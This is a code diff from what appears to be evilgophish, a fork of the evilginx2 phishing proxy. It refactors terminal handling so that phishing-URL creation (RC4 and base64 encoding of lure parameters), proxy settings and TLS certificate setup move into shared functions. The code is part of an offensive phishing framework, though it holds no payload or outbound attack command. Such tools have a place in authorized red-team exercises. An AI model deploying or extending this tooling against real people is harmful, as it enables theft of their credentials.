@@ -2,14 +2,11 @@ package core
 
 import (
 	"bufio"
-	"crypto/rc4"
-	"encoding/base64"
 	"encoding/csv"
 	"encoding/json"
 	"fmt"
 	"io"
 	"io/ioutil"
-	"math/rand"
 	"net/url"
 	"os"
 	"path/filepath"
@@ -18,6 +15,8 @@ import (
 	"strconv"
 	"strings"
 	"time"
+
+	"evilgophish/shared/rid"
 
 	"github.com/kgretzky/evilginx2/database"
 	"github.com/kgretzky/evilginx2/log"
@@ -295,7 +294,7 @@ func (t *Terminal) handleProxy(args []string) error {
 	} else if pn == 1 {
 		switch args[0] {
 		case "enable":
-			err := t.p.setProxy(true, t.p.cfg.proxyConfig.Type, t.p.cfg.proxyConfig.Address, t.p.cfg.proxyConfig.Port, t.p.cfg.proxyConfig.Username, t.p.cfg.proxyConfig.Password)
+			err := t.p.SetProxy(true)
 			if err != nil {
 				return err
 			}
@@ -303,7 +302,7 @@ func (t *Terminal) handleProxy(args []string) error {
 			log.Important("you need to restart evilginx for the changes to take effect!")
 			return nil
 		case "disable":
-			err := t.p.setProxy(false, t.p.cfg.proxyConfig.Type, t.p.cfg.proxyConfig.Address, t.p.cfg.proxyConfig.Port, t.p.cfg.proxyConfig.Username, t.p.cfg.proxyConfig.Password)
+			err := t.p.SetProxy(false)
 			if err != nil {
 				return err
 			}
@@ -1278,33 +1277,7 @@ func (t *Terminal) checkStatus() {
 }
 
 func (t *Terminal) manageCertificates(verbose bool) {
-	if !t.p.developer {
-		if t.cfg.IsAutocertEnabled() {
-			hosts := t.p.cfg.GetActiveHostnames("")
-			//wc_host := t.p.cfg.GetWildcardHostname()
-			//hosts := []string{wc_host}
-			//hosts = append(hosts, t.p.cfg.GetActiveHostnames("")...)
-			if verbose {
-				log.Info("obtaining and setting up %d TLS certificates - please wait up to 60 seconds...", len(hosts))
-			}
-			err := t.p.crt_db.setManagedSync(hosts, 60*time.Second)
-			if err != nil {
-				log.Error("failed to set up TLS certificates: %s", err)
-				log.Error("run 'test-certs' command to retry")
-				return
-			}
-			if verbose {
-				log.Info("successfully set up all TLS certificates")
-			}
-		} else {
-			err := t.p.crt_db.setUnmanagedSync(verbose)
-			if err != nil {
-				log.Error("failed to set up TLS certificates: %s", err)
-				log.Error("run 'test-certs' command to retry")
-				return
-			}
-		}
-	}
+	t.p.ManageCertificates(verbose)
 }
 
 func (t *Terminal) sprintPhishletStatus(site string) string {
@@ -1718,27 +1691,7 @@ func (t *Terminal) exportPhishUrls(export_path string, phish_urls []string, phis
 }
 
 func (t *Terminal) createPhishUrl(base_url string, params *url.Values) string {
-	var ret string = base_url
-	if len(*params) > 0 {
-		key_arg := strings.ToLower(GenRandomString(rand.Intn(3) + 1))
-
-		enc_key := GenRandomAlphanumString(8)
-		dec_params := params.Encode()
-
-		var crc byte
-		for _, c := range dec_params {
-			crc += byte(c)
-		}
-
-		c, _ := rc4.NewCipher([]byte(enc_key))
-		enc_params := make([]byte, len(dec_params)+1)
-		c.XORKeyStream(enc_params[1:], []byte(dec_params))
-		enc_params[0] = crc
-
-		key_val := enc_key + base64.RawURLEncoding.EncodeToString([]byte(enc_params))
-		ret += "?" + key_arg + "=" + key_val
-	}
-	return ret
+	return rid.CreatePhishUrl(base_url, params)
 }
 
 func (t *Terminal) sprintVar(k string, v string) string {
